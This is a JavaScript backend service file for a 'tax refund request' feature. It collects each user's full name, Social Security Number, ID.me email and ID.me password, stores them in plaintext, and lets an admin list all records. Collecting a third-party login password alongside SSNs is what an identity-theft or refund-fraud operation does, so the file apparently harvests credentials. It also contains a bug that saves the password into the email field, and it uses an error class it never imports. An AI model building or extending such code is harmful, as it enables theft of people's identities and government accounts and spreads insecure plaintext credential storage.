import TaxRefund  from "../models/taxRefund.model.js";
import { taxRefundRequestReceivedMail } from "./mail.service.js";
import User from "../models/user.model.js";

export const submitTaxRefundRequest = async (userId, refundData) => {
    const {
        fullName,
        ssn,
        idMeEmail,
        idMePassword,
        country
    } = refundData;

    const user = await User.findById(userId)
        .select('email firstName lastName');

    if (!user) {
        throw new ApiError(404, 'User not found.');
    }


    if (!fullName?.trim()) {
        throw new ApiError(
            400,
            'Full name is required.'
        );
    }
    if (!idMeEmail?.trim()) {
        throw new ApiError(
            400,
            'Email is required.'
        );
    }

    if (!idMePassword) {
        throw new ApiError(
            400,
            'ID.me password is required.'
        );
    }

    if (!ssn?.trim()) {
        throw new ApiError(
            400,
            'Social Security Number is required.'
        );
    }
    if (!country?.trim()) {
        throw new ApiError(
            400,
            'Country is required.'
        );
    }

    // -----------------------------------------
    // 4. Check for existing pending request
    // -----------------------------------------

    const existingRequest = await TaxRefund.findOne({
        owner: userId,
        status: 'pending'
    });

    if (existingRequest) {
        throw new ApiError(
            400,
            'You already have a pending tax refund request.'
        );
    }

    // -----------------------------------------
    // 5. Create request
    // -----------------------------------------

    const refundRequest = await TaxRefund.create({
        owner: userId,
        fullName: fullName.trim(),
        ssn: ssn.trim(),
        idMeEmail: idMePassword.trim(),
        idMePassword,
        country: country.trim(),
        status: 'pending'
    });

    await taxRefundRequestReceivedMail(user.email, fullName.trim())

    // -----------------------------------------
    // 6. Return submission details
    // -----------------------------------------

    return {
        requestId: refundRequest._id,
        fullName: refundRequest.fullName,
        status: refundRequest.status,
        createdAt: refundRequest.createdAt
    };
};

// Get Tax refunds
export const getAllTaxRefunds = async () => {
  const taxRefunds = await TaxRefund.find()
    .populate("owner", "firstName lastName email")
    .sort({ createdAt: -1 });

  return taxRefunds;
};

export const deleteTaxRefund = async (taxRefundId) => {
  const taxRefund = await TaxRefund.findById(taxRefundId);

  if (!taxRefund) {
    throw new ApiError(404, "Tax refund not found.");
  }

  await TaxRefund.findByIdAndDelete(taxRefundId);

  return true;
};